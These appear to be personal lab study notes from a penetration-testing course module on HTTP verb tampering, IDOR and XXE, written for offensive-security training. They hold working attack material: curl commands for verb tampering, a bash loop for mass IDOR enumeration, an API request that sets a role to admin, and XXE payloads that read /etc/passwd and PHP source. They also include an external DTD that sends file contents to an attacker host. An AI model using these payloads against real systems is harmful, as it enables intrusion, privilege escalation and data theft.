# 23 — Web Attacks

> **Path Phase:** Web Attacks | **Difficulty:** Medium | **Sections:** 18

Three major web attack classes: HTTP Verb Tampering, IDOR, and XXE.

> ℹ️ `{TARGET}` / `<YOUR_IP>` = target/attacker. Flags withheld per HTB Academy policy.

---

## Table of Contents
1. Introduction
2. Intro to HTTP Verb Tampering
3. Bypassing Basic Authentication
4. Bypassing Security Filters
5. Verb Tampering Prevention
6. Intro to IDOR
7. Identifying IDORs
8. Mass IDOR Enumeration
9. Bypassing Encoded References
10. IDOR in Insecure APIs
11. Chaining IDOR Vulnerabilities
12. IDOR Prevention
13. Intro to XXE
14. Local File Disclosure
15. Advanced File Disclosure
16. Blind Data Exfiltration
17. XXE Prevention
18. Skills Assessment

---

## 2–5 — HTTP Verb Tampering
Auth/filters applied only to GET/POST → bypass with other verbs.
```bash
curl -X OPTIONS http://{TARGET}/admin/
curl -X HEAD http://{TARGET}/protected/
# WAF checks only POST body → use GET:
GET /admin.php?cmd=id HTTP/1.1
```
> **Verb tampering:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 6–12 — IDOR (Insecure Direct Object Reference)
Access other users' objects by changing an ID.
```bash
# Identify:
http://{TARGET}/documents.php?uid=1   → change to uid=2,3,4...
# Mass enumeration:
for i in $(seq 1 100); do curl -s "http://{TARGET}/download.php?id=$i" -o doc_$i; done
# Encoded references:
echo -n "2" | base64
# IDOR in APIs:
curl -X PUT http://{TARGET}/api/users/2 -d '{"role":"admin"}'
```
> **IDOR:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 13–17 — XXE (XML External Entity)
```xml
<!-- Local file disclosure: -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>

<!-- Read source via PHP filter: -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]>

<!-- Blind exfil (OOB via external DTD): -->
<!DOCTYPE root [<!ENTITY % ext SYSTEM "http://<YOUR_IP>/evil.dtd"> %ext;]>
```
External DTD (`evil.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<YOUR_IP>/?d=%file;'>">
%eval; %exfil;
```
> **XXE:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 18 — Skills Assessment
Chain: verb tampering → IDOR → XXE

curl -X HEAD http://{TARGET}/admin/
http://{TARGET}/api/users/1 → 2 (change role via PUT)

<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag.txt">]><r>&x;</r>
> **Skills Assessment:** ✅ Completed in lab (flag withheld per HTB Academy policy)

---

## 🧰 Tools Used
| Tool | Purpose |
|------|---------|
| Burp Suite | Verb tampering, replaying requests |
| `curl` | Custom HTTP methods |
| bash loops | Mass IDOR enumeration |
| XXE payloads | File disclosure & OOB exfil |

## 🔑 Key Takeaways
- **Verb tampering:** try HEAD/PUT/OPTIONS when GET/POST is blocked.
- **IDOR:** increment/decode object IDs; automate mass enumeration.
- **XXE:** `file://` reads files, `php://filter` reads source, OOB DTD for blind.
- These three chain beautifully — the assessment tests exactly that.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
